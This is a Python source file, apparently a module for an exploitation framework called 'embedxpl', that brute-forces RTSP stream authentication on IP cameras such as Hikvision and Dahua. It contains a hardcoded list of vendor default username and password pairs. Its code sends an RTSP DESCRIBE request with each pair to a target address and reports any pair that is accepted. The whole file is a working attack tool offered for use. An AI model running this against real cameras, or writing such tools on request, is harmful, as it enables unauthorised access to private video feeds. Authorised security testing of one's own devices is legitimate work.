# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""RTSP Stream Authentication Brute-Force.

Brute-forces RTSP stream credentials using common default usernames
and passwords for IP cameras.

Version: 1.0.0
"""

import socket
from typing import List, Tuple

from embedxpl.core.exploit import *
from embedxpl.core.exploit.exploit import BaseExploit

_DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("user", "user"),
    ("guest", "guest"),
    ("admin", "hikadmin"),
    ("admin", "Admin12345"),
    ("admin", "HaiKang"),
    ("admin", "dahua"),
    ("666666", "666666"),
    ("888888", "888888"),
]

_RTSP_DESCRIBE = (
    "DESCRIBE rtsp://{user}:{password}@{host}:{port}/{stream} RTSP/1.0\r\n"
    "CSeq: 2\r\n"
    "Accept: application/sdp\r\n"
    "\r\n"
)


class Exploit(BaseExploit):
    """RTSP Stream Authentication Brute-Force.

    Attempts to authenticate to an RTSP stream using common default
    credentials for IP cameras (Hikvision, Dahua, generic).

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "RTSP Stream Credential Brute-Force",
        "description": (
            "Brute-forces RTSP stream authentication using common default credentials "
            "for IP cameras. Supports Hikvision, Dahua, Axis, and generic cameras."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": (
            "https://tools.ietf.org/html/rfc2326",
        ),
        "devices": (
            "Hikvision", "Dahua", "Axis", "Foscam", "Generic IP Camera",
        ),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(554, "RTSP port")
    stream = OptString("Streaming/Channels/1", "RTSP stream path")
    timeout = OptInteger(3, "Timeout per attempt")

    def run(self) -> None:
        print_status(
            "RTSP brute-force on {}:{}{}...".format(
                self.target, self.port, self.stream
            )
        )

        for username, password in _DEFAULT_CREDENTIALS:
            if self._try_credentials(username, password):
                print_success(
                    "Valid credentials — {}:{} @ rtsp://{}:{}/{}".format(
                        username, password, self.target, self.port, self.stream
                    )
                )
                return

        print_error("No valid credentials found from default list.")

    def _try_credentials(self, username: str, password: str) -> bool:
        """Try a single credential pair via RTSP DESCRIBE.

        Args:
            username: RTSP username.
            password: RTSP password.

        Returns:
            True if authentication was successful.
        """
        request = _RTSP_DESCRIBE.format(
            user=username,
            password=password,
            host=self.target,
            port=self.port,
            stream=self.stream,
        )
        try:
            sock = socket.create_connection(
                (self.target, int(self.port)), timeout=float(self.timeout)
            )
            sock.sendall(request.encode())
            sock.settimeout(float(self.timeout))
            response = sock.recv(1024).decode("utf-8", errors="replace")
            sock.close()

            if "RTSP/1.0 200 OK" in response:
                return True
            if "RTSP/1.0 401" in response:
                return False
        except Exception:
            pass
        return False

    @mute
    def check(self) -> bool:
        try:
            with socket.create_connection(
                (self.target, int(self.port)), timeout=3
            ):
                return True
        except Exception:
            return False
